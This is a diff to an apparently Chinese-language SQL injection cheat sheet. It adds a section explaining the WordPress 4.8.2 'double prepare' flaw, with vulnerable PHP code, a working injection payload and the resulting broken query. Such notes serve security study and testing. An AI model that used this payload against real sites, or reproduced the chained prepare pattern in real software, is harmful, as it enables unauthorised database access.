@@ -11,6 +11,7 @@ SQL is a famous database engine which is used with web server. In this situation
 *  [sql權限問題](#sql-privilege-management)  
 *  [繞過ASPX的RequestValidation](#bypass-requestvalidation-on-aspx)  
 *  [sprintf/vprintf](#sprintf-vprintf)   
+*  [Wordpress4.8.2 double prepare漏洞用法](#wordpress4.8.2-double-prepare漏洞用法)  
 *  [NoSQL injection](#nosql-injection)  
 *  [邏輯漏洞](#logic-vul)  
 *  [Tools](#tools)  
@@ -309,7 +310,27 @@ End If
 
 ### sprintf vprintf
 不會檢查格式化字串的類型。  
-SQLi中，```%'```會被轉譯成`\'` -> `%\'` `%\`被吃掉，`'`逃逸。
+SQLi中，```%'```會被轉譯成`\'` -> `%\'` `%\`被吃掉，`'`逃逸。  
+
+### Wordpress4.8.2 Double Prepare漏洞用法  
+Wordpress自己寫了`prepare()`預編譯sql語句然後再`execute()`，有別於PDO下的`prepare()`,`blind()`,`execute()`。這是出現在wordpress4.8.3以前的版本的問題...  
+```php
+$query = $wpdb->prepare( "SELECT * FROM table WHERE column = %s", $_GET['c1'] ); 
+$wpdb->query( $query );
+```  
+若我注入`1' or '1'='1`，`prepare()`會用單引號將它包起來置入query語句，並且轉譯單引號。`SELECT * FROM table WHERE column = ' 1\' or \'1\'=\'1 '`，無解...但是如果開發者今天這樣寫的話...  
+```php
+$query = $wpdb->prepare( "SELECT * FROM table WHERE column1 = %s", $_GET['c1'] ); 
+$query = $wpdb->prepare( $query . " AND column2 = %s", $_GET['c2'] );
+$wpdb->query( $query );
+
+// c1=%s&c2[]=or 1=1--&c2[]=a
+執行結果
+prepare1: SELECT * FROM table WHERE column1 = '%s' AND column2 = %s;
+prepare2: SELECT * FROM table WHERE column1 = ' 'or 1=1--' ' AND column2 = 'a';
+```  
+原因出在prepare()的檢查步驟，我們沒有輸入`'`，而是讓prepare()自己輸入單引號來協助我們閉合...  
+在Wordpress4.8.3的版本之後，patch成使用者輸入的`%`會被取代為66bytes的秘密字串：`{xxxxx...xxx}s`  
   
 # NoSQL injection
 MongoDB用json格式來解析資料.  
